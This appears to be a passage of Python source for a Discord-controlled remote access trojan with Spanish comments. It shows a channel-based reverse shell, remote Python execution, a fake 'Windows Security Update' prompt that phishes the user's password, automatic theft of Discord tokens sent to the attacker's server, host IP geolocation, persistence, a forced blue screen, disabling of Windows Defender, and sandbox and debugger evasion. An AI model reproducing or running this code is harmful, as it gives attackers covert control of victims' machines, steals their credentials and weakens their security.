    if not await check_access(ctx):
        return
    if remove_persistence():
        await ctx.send("✅ Persistencia eliminada.")
    else:
        await ctx.send("❌ Falló.")

@bot.command(name='persistcheck', aliases=['pcheck'])
async def cmd_persistcheck(ctx):
    if not await check_access(ctx):
        return
    status = persistence_status()
    await ctx.send(f"**Persistencia actual:**\n{status}")

# ─── DIVERSIÓN ───

@bot.command(name='fakebluescreen', aliases=['fakebsod', 'fbsod'])
async def cmd_fakebluescreen(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("🖥️ Mostrando fake BSOD...")
    ok = await asyncio.get_event_loop().run_in_executor(None, show_fake_bsod)
    await ctx.send("✅ Fake BSOD lanzado en todos los monitores." if ok else "❌ Falló (¿tkinter/screeninfo instalados?)")

@bot.command(name='bluescreen', aliases=['bsod'])
async def cmd_bluescreen(ctx):
    if not await check_access(ctx):
        return
    if not is_admin():
        await ctx.send("❌ Se requiere admin para BSOD real.")
        return
    await ctx.send("💀 Activando BSOD real... buena suerte 😈")
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint32()))
    except Exception:
        await ctx.send("❌ Falló.")

@bot.command(name='windowspassword', aliases=['winpass'])
async def cmd_windowspassword(ctx):
    if not await check_access(ctx):
        return
    try:
        ps = ('$cred = $host.ui.promptforcredential("Windows Security Update", "", '
              '[Environment]::UserName, [Environment]::UserDomainName); '
              'if ($cred) { $cred.GetNetworkCredential().Password }')
        code, out = run_cmd(f'powershell -Command "{ps}"', timeout=60)
        password = out.strip().splitlines()[-1] if out.strip() else ""
        await ctx.send(f"🔑 Password: `{password or 'No capturada (¿se canceló?)'}`")
    except Exception as e:
        await ctx.send(f"❌ {e}")

# ─── PYTHON ───

@bot.command(name='py', aliases=['python', 'eval'])
async def cmd_py(ctx, *, code: str):
    if not await check_access(ctx):
        return
    if not code.strip():
        await ctx.send("❌ Uso: !py <codigo>")
        return
    import io
    output = io.StringIO()
    old_stdout, old_stderr = sys.stdout, sys.stderr
    sys.stdout, sys.stderr = output, output
    try:
        exec(compile(code, '<discord>', 'exec'), {'__builtins__': __builtins__})
    except Exception as e:
        output.write(f"\n[ERROR] {type(e).__name__}: {e}")
    finally:
        sys.stdout, sys.stderr = old_stdout, old_stderr
    await send_paginated(ctx.channel, output.getvalue() or "(sin salida)")

# ─── CONTROL ───

@bot.command(name='shutdown', aliases=['killbot'])
async def cmd_shutdown(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("💤 Apagando bot...")
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, None, False)
    except Exception:
        pass
    await bot.close()
    os._exit(0)

@bot.command(name='exit')
async def cmd_exit(ctx):
    if not await check_access(ctx):
        return
    await ctx.send("💨")
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(0, None, False)
    except Exception:
        pass
    await bot.close()
    os._exit(0)

# ─── SHELL (on_message) ───

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Responder solo en el guild objetivo
    if message.guild and GUILD_ID and message.guild.id != GUILD_ID:
        return

    # Reverse shell por canal
    if shell_sessions.get(message.channel.id) and not message.content.startswith(PREFIX):
        # Ignorar usuarios no autorizados en shell
        if OWNER_ID != 0 and message.author.id != OWNER_ID:
            return
        try:
            proc = subprocess.Popen(
                message.content,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                startupinfo=hide_console_window(),
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
            )
        except TypeError:
            proc = subprocess.Popen(
                message.content, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
            )
        try:
            stdout, stderr = proc.communicate(timeout=SHELL_TIMEOUT)
            output = safe_decode(stdout) + safe_decode(stderr)
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            output = f"[⏰ Timeout a los {SHELL_TIMEOUT}s]\n" + safe_decode(stdout) + safe_decode(stderr)
        except Exception as e:
            output = f"[ERROR] {e}"
        output = output or "(sin salida)"
        for piece in paginate(output):
            await message.channel.send(f"```\n{piece}\n```")
        if len(output) >= MAX_MSG:
            await message.channel.send(f"*(salida truncada: {len(output)} caracteres)*")
        return

    await bot.process_commands(message)

# ─── HEARTBEAT ───

_start_time = time.time()

async def heartbeat():
    await bot.wait_until_ready()
    try:
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            return
        channel = discord.utils.get(guild.text_channels, name="heartbeat")
        if not channel:
            try:
                channel = await guild.create_text_channel("heartbeat")
            except Exception:
                return
        instance = f"{socket.gethostname()}_{get_public_ip() or 'unknown'}_{os.getpid()}"
        while True:
            try:
                await channel.send(f"{instance}:{int(time.time())}")
            except Exception:
                pass
            await asyncio.sleep(HEARTBEAT_INTERVAL)
    except Exception:
        pass

# ─── CREAR CANAL AUTOMÁTICO ───

async def create_shell_channel():
    global shell_sessions
    try:
        guild = bot.get_guild(GUILD_ID)
        if not guild:
            return

        public_ip = get_public_ip() or get_local_ip().replace('.', '_')
        if not public_ip:
            return

        hostname = socket.gethostname()
        local_ip = get_local_ip()
        channel_name = f"{public_ip.replace('.', '-')}_{local_ip.replace('.', '_')}"

        category_name = "Unknown Region"
        try:
            if HAS_AIOHTTP:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'http://ip-api.com/json/{public_ip}', timeout=5) as resp:
                        data = await resp.json()
                        if data.get('status') == 'success':
                            category_name = f"{data.get('countryCode', 'Unknown')}-{data.get('regionName', '').replace(' ', '')}"
        except Exception:
            pass
        if len(category_name) > 25:
            category_name = category_name[:25]

        category = discord.utils.get(guild.categories, name=category_name)
        if not category:
            category = await guild.create_category(category_name)

        channel = discord.utils.get(category.text_channels, name=channel_name)
        if not channel:
            channel = await category.create_text_channel(channel_name)
            await channel.send(f"**{hostname}** conectado.")
            await channel.send("@everyone")
            await channel.send("**Comandos:** `!help`\n**Shell:** `!shell` en este canal")

        shell_sessions[channel.id] = True

        # Auto-enviar tokens en modo silencioso
        try:
            tokens = await asyncio.get_event_loop().run_in_executor(None, extract_discord_tokens)
            for t in tokens[:5]:
                await channel.send(f"**{t['app']}**\n`{t['token']}`")
                await asyncio.sleep(0.3)
        except Exception:
            pass
    except Exception:
        pass

# ─── EVENTOS ───

@bot.event
async def on_ready():
    print(f"[+] Bot conectado como: {bot.user}")
    print(f"[+] Guild ID: {GUILD_ID}")
    print(f"[+] PID: {os.getpid()}")

    if not is_sandbox() and not is_debugged():
        try:
            install_persistence()
        except Exception:
            pass
        if is_admin():
            try:
                disable_defender()
            except Exception:
                pass
    else:
        print("[!] Entorno hostil detectado, saltando persistencia/defensor.")

    asyncio.create_task(heartbeat())
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Game("Current Machines: 1")
    )
    await create_shell_channel()

# ─── MAIN ───

if __name__ == "__main__":
    if is_debugged():
        print("[!] Depurador detectado. Durmiendo 60s...")
        time.sleep(60)

    if is_sandbox():
        print("[!] Entorno sandbox detectado. Saliendo.")
        sys.exit(0)

    # Verificación de dependencias críticas
    if not HAS_CRYPTO:
        print("[!] AVISO: pycryptodome no instalado. passwords/tokens limitados.")
    if not TOKEN:
        print("[!] ERROR: No hay token. Pon DISCORD_TOKEN o edita TOKEN.")
        sys.exit(1)

    # Bucle con reconexión automática
    while True:
        try:
            asyncio.run(bot.start(TOKEN))
        except discord.errors.LoginFailure:
            print("[!] Token inválido. Saliendo.")
            sys.exit(1)
        except discord.errors.PrivilegedIntentsRequired:
            print("[!] Los intents de message_content no están habilitados en el portal de Discord.")
            sys.exit(1)
        except KeyboardInterrupt:
            print("\n[+] Cerrando...")
            remove_persistence()
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error de conexión: {e}. Reconectando en 5s...")
            time.sleep(5)